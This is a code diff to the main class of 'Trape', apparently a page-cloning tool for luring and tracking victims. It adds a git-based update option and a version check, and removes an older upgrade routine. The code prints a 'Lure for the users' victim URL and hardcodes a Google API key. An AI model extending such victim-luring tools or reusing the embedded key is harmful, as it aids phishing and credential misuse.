@@ -20,7 +20,7 @@ import socket
 import sys
 import os
 from core.utils import utils
-from subprocess import call
+import subprocess
 import requests
 import hashlib, binascii
 from threading import Timer
@@ -30,7 +30,7 @@ import atexit
 class Trape(object):
 	def __init__(self, stat = 0):
 		self.name_trape = "Trape"
-		self.version = 2.0
+		self.version = "2.0"
 		self.stats_path = utils.generateToken(7)
 		self.home_path = utils.generateToken(18)
 		self.logout_path = utils.generateToken(6)
@@ -72,13 +72,14 @@ class Trape(object):
 			if self.googl == '':
 				self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'
 			
-			parser = argparse.ArgumentParser("python trape.py -u <<Url>> -p <<Port>>", version="1.0.0")
+			parser = argparse.ArgumentParser("python trape.py -u <<Url>> -p <<Port>>", version=self.version)
 			parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')
 			parser.add_argument('-p', '--port', dest='port', help='Insert your port')
 			parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')
 			parser.add_argument('-l', '--local', dest='local', help='Insert your home file')
 			parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')
 			parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')
+			parser.add_argument('-ud', '--update', dest='update', help='Update trape to the latest version')
 
 			options = parser.parse_args()
 
@@ -149,10 +150,33 @@ class Trape(object):
 			if (options.accesskey):
 			    self.stats_key = options.accesskey
 
+			# Check current updates
+			if (options.update):
+				utils.Go("\033[H\033[J")
+				utils.Go("Updating..." + " " + utils.Color['blue'] + "trape" + utils.Color['white'] + "..." + "\n")
+				subprocess.check_output(["git", "reset", "--hard", "origin/master"])
+				subprocess.check_output(["git", "pull"])
+				utils.Go("Trape Updated... Please execute again...")
+				sys.exit(0)
+
 	# Design principal of the header of trape
 	def header(self):
 		if self.stat == 1:
+			# Principal header of tool
 			utils.banner()
+
+			# Update verification
+			changeLog = requests.get("https://raw.githubusercontent.com/thewhiteh4t/pwnedOrNot/master/version.txt", timeout = 5)
+			changeLog = changeLog.text.split(" ")[1]
+			changeLog = changeLog.strip()
+			if changeLog != self.version:
+				utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['whiteBold'] + " " + "UPDATES:" + " " + utils.Color['yellowBold'] + "NEW VERSION IS AVAILABLE: " + utils.Color['white'] + "v" + utils.Color['redBold'] + changeLog + utils.Color['white'] + " " + "(install changes)")
+				utils.Go("")
+			else:
+				utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['whiteBold'] + " " + "UPDATES:" + " " + utils.Color['greenBold'] + "RUNNING RECENT VERSION" + utils.Color['white'])
+				utils.Go("")
+
+			# Local information vars	
 			utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "LOCAL INFORMATION" + utils.Text['end'])
 			utils.Go("\t" + "-------------------")
 			utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Lure for the users: " + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)
@@ -218,25 +242,6 @@ class Trape(object):
 	def main(self):
 		import core.sockets
 
-	# Check current upgrades
-	def checkVersion(self):
-		pass
-
-	# Check current upgrades
-	def trape_upgrade(self):
-		result = call(["git", "pull"]) 
-		if result == 0:				
-			changeLog = json.load(open('changelog.json'))
-			
-			item = changeLog[0]
-			for key, value in item.iteritems():
-				utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + utils.Color['white'] + str(key) + ': ' + str(value))
-			time.sleep(5)
-			utils.Go("Please press enter to continue and then restart Trape")
-			raw_input()
-			sys.exit(0)
-		else:
-			utils.Go("Update unavailable, please check your connection")
 
 	# Create config file
 	def trape_config(self):
